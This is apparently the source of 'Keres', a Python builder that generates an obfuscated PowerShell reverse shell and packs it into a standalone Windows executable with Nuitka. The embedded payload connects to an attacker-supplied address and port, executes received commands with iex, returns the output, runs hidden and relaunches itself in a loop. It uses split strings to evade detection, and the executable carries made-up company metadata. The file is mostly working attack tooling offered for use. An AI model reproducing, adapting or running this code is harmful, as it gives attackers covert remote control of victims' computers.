import argparse
import colorama
from colorama import Fore, Style
import os
import random
import subprocess
import sys
import platform

def display_ansi_art(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        ansi_art = file.read()
    print(ansi_art)

def create_exe(py_file):
    try:
        icons_directory = "icons"
        icon_file = os.path.join(icons_directory, 'keres.ico')  # Default icon file path
        
        python_executable = "python" if is_windows else "python3"
        nuitka_command = [
        python_executable,"python3", "-m", "nuitka",
    "--onefile",
    "--company-name=Keres",
    "--file-version=1.2",
    "--copyright=COPYRIGHT@Keres",
    "--trademarks=No Enemies",
    f"--windows-icon-from-ico=icons/keres.ico",
    "--standalone",
    "--remove-output",
    f"--output-dir=Output",
    f"--output-filename=Keres",
    py_file
]

        subprocess.run(nuitka_command)
        print("Executable created successfully.")
    except Exception as e:
        print("An error occurred:", str(e))

def main():
    colorama.init(autoreset=True)  # Initialize colorama for Windows
    ans_directory = 'banners'
    spec= os.path.abspath(".")
    spec_files= [file for file in os.listdir(spec) if file.endswith('.spec')]
    ans_files = [file for file in os.listdir(ans_directory) if file.endswith('.ans')]
    if not ans_files:
        print("No .ans files found in the current directory.")
        return
    for file in spec_files:
        if file.endswith('.spec'):
            file_path = os.path.join(spec, file)
            os.remove(file_path)
            print(f"Deleted file: {file}")
    random_ans_file = os.path.join(ans_directory, random.choice(ans_files))
    display_ansi_art(random_ans_file)
    introduction = ( 
        Fore.YELLOW + "                  Remember, You have no enemies \n"
        "Version: 1.0\n"
        "Author: ELMERIKH\n" + Style.RESET_ALL
    )
    print(introduction)
    ans_directory = 'banners'
    parser = argparse.ArgumentParser(description="Keres=Demon")
    parser.add_argument("-a", "--address", required=True, help="Specify the target address")
    parser.add_argument("-p", "--port", required=True, type=int, help="Specify the target port")
    parser.add_argument("-Ps", "--save_ps_command", action="store_true", help="Save the PowerShell payload to a Keres.ps1 file in the Output folder")

    args = parser.parse_args()
    server_address = args.address
    port_number = args.port
    global pow
    ps_command = f'''echo 'hello i am merikh' ; $uniqueIdentifier = "Keres" ;while ($true) {{ 
        $mutex = New-Object Threading.Mutex($false, $mutexName)
        if ($mutex.WaitOne(0, $false)) {{
            try {{
                $isRunning = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }};
                if (-not $isRunning) {{ 
                    Start-Process $PSHOME\powe''rshell.exe -ArgumentList {{$uniqueIdentifier;$client = New-Object Sys''tem.N''et.Sock''ets.TCPCl''ient('{server_address}',{port_number});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName S''ystem.T''ext.AS''CIIE''ncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}} -WindowStyle Hid''den 
                }} else {{
                    Write-Host "Script is already running."
                }};  
            }} finally {{
                $mutex.ReleaseMutex()
            }}
        }} else {{
            Write-Host "Another instance is already running."
        }} 
        Start-Sleep -Seconds 10 
    }}'''
    if args.save_ps_command:
        ps_file_path = os.path.join("Output", "Keres.ps1")
        with open(ps_file_path, 'w') as ps_file:
            ps_file.write(ps_command)
        print('\n')
        print('generated  Powershell command')
        print('\n')
        print(f"PowerShell command saved to: {ps_file_path}")
        return
    if hasattr(sys, '_MEIPASS'):
        bundle_dir = sys._MEIPASS
    else:
        bundle_dir = os.path.abspath(".")
    pewpew=ps_command
    paw_path = os.path.join(bundle_dir, 'pewpew.py')
    with open(paw_path, 'r') as paw_file:
        paw_contents = paw_file.read()
    start_marker = "ps_command = ''' "
    end_marker = "'''"
    start_index = paw_contents.index(start_marker) + len(start_marker)
    end_index = paw_contents.index(end_marker, start_index)

# Replace the old powershell section with the new formatted PowerShell script
    new_paw_contents = paw_contents[:start_index] + pewpew + paw_contents[end_index:]
    with open(paw_path, 'w') as paw_file:
        paw_file.write(new_paw_contents)



    print('\n')
    print('generated  Powershell command')
    # Access the values using args.address and args.port
    
    print('\n')
    print("Creating the executable...")
    print('\n')
    create_exe('pewpew.py')
    print("Finished creating the executable in Output folder.")

if __name__ == "__main__":
    main()
